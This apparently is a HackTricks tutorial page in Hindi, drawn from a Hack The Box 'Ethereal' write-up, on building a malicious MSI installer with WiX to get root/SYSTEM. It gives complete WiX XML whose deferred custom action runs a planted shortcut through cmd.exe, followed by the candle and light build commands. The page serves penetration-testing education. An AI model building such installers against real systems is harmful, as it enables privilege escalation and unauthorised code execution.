{{#include ../../banners/hacktricks-training.md}}

# Creating Malicious MSI and Getting Root

MSI इंस्टॉलर का निर्माण wixtools का उपयोग करके किया जाएगा, विशेष रूप से [wixtools](http://wixtoolset.org) का उपयोग किया जाएगा। यह उल्लेख करना महत्वपूर्ण है कि वैकल्पिक MSI बिल्डरों का प्रयास किया गया, लेकिन वे इस विशेष मामले में सफल नहीं हुए।

wix MSI उपयोग के उदाहरणों की व्यापक समझ के लिए, [इस पृष्ठ](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) पर परामर्श करना उचित है। यहाँ, आप wix MSI के उपयोग को प्रदर्शित करने वाले विभिन्न उदाहरण पा सकते हैं।

उद्देश्य एक ऐसा MSI उत्पन्न करना है जो lnk फ़ाइल को निष्पादित करेगा। इसे प्राप्त करने के लिए, निम्नलिखित XML कोड का उपयोग किया जा सकता है ([xml from here](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
यह ध्यान रखना महत्वपूर्ण है कि Package तत्व में InstallerVersion और Compressed जैसे गुण होते हैं, जो इंस्टॉलर के संस्करण को निर्दिष्ट करते हैं और यह संकेत करते हैं कि पैकेज संकुचित है या नहीं, क्रमशः।

निर्माण प्रक्रिया में msi.xml से wixobject उत्पन्न करने के लिए wixtools से candle.exe उपकरण का उपयोग करना शामिल है। निम्नलिखित कमांड निष्पादित की जानी चाहिए:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
इसके अलावा, यह उल्लेख करना महत्वपूर्ण है कि पोस्ट में एक छवि प्रदान की गई है, जो कमांड और इसके आउटपुट को दर्शाती है। आप दृश्य मार्गदर्शन के लिए इसका संदर्भ ले सकते हैं।

इसके अलावा, light.exe, जो कि wixtools का एक और उपकरण है, wixobject से MSI फ़ाइल बनाने के लिए उपयोग किया जाएगा। निष्पादित करने के लिए कमांड इस प्रकार है:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
पिछले आदेश के समान, एक छवि पोस्ट में शामिल की गई है जो आदेश और इसके आउटपुट को दर्शाती है।

कृपया ध्यान दें कि जबकि यह सारांश मूल्यवान जानकारी प्रदान करने का लक्ष्य रखता है, अधिक व्यापक विवरण और सटीक निर्देशों के लिए मूल पोस्ट को संदर्भित करने की सिफारिश की जाती है।

## संदर्भ

- [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)

{{#include ../../banners/hacktricks-training.md}}
